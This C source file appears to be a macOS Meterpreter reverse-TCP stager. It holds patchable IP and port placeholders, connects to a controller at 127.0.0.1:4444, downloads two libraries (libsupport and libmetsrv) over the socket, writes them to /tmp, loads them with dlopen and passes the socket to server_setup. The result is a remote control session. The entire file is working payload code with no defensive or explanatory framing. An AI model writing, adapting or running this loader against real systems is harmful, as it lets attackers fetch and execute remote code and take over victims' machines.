#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <arpa/inet.h> 
#include <dlfcn.h>
#include <ctype.h>

static char ip_str[] =   "XXXX127.0.0.1           ";
static char port_str[] = "YYYY4444                ";

char *trim(char *str)
{
    int len = 0;
    char *start = str - 1;
    char *end = 0;

    if(!str) return 0;
    if(str[0] == '\0') return str;

    len = strlen(str);
    end = str + len;

    while(isspace(*(++start)));
    while(isspace(*(--end)) && end != start);

    if(str + len - 1 != end) *(end + 1) = '\0';
    else if( start != str &&  end == start ) *str = '\0';

    end = str;
    if(start != str)
    {
        while(*start) *end++ = *start++;
        *end = '\0';
    }

    return str;
}

int get_socket(char* ip, int port)
{
    int sockfd = 0, n = 0;
    struct sockaddr_in serv_addr; 

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        return 0;
    }

    memset(&serv_addr, '0', sizeof(serv_addr)); 

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port); 

    if (inet_pton(AF_INET, ip, &serv_addr.sin_addr)<=0)
    {
        return 0;
    }

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        return 0;
    }

    return sockfd;
}

char* get_library(int socket, int* size)
{
    int buffer_len=0, bytes_recv, received=0;

    bytes_recv = read(socket, (char*)&buffer_len, 4);
    if (bytes_recv != 4 || buffer_len <= 0)
    {     
        exit(1);
    }

    char* buffer = (char*)malloc(buffer_len);
    if (!buffer)
    {
        exit(1);
    }

    while (received < buffer_len)
    {
        bytes_recv = read(socket, buffer+received, buffer_len-received);
        received += bytes_recv;
    }

    *size = buffer_len;
    return buffer;
}

void write_to_file(char* path, char* buffer, int size)
{
    FILE* file = fopen(path, "w");
    int i;
    for (i = 0; i < size; i++)
    {
        fprintf(file, "%c", *(buffer+i));
    }
    fclose(file);
}

int main()
{
    char* ip = trim(ip_str + 4);
    char* port = trim(port_str+4);

    int socket = get_socket(ip, atoi(port));
    if (!socket)
    {
        exit(1);
    }

    int libraries_size;
    read(socket, (char*)&libraries_size, 4);
    
    int libmetsrv_buffer_size=0, libsupport_buffer_size=0;
    char* libsupport_buffer = get_library(socket, &libsupport_buffer_size);
    char* libmetsrv_buffer = get_library(socket, &libmetsrv_buffer_size);

    write_to_file("/tmp/libsupport.dylib", libsupport_buffer, libsupport_buffer_size);
    write_to_file("/tmp/libmetsrv.dylib", libmetsrv_buffer, libmetsrv_buffer_size);

    void* libsupport_hande = dlopen("/tmp/libsupport.dylib", RTLD_NOW | RTLD_LOCAL);
    void* libmetsrv_handle = dlopen("/tmp/libmetsrv.dylib", RTLD_NOW | RTLD_LOCAL);

    if (libmetsrv_handle) 
    {
        int (*server_setup)(int);
        server_setup = dlsym(libmetsrv_handle, "server_setup");
        if (server_setup)
        {
            return server_setup(socket);
        }
    }

    free(libsupport_buffer);
    free(libmetsrv_buffer);
    return 0;
}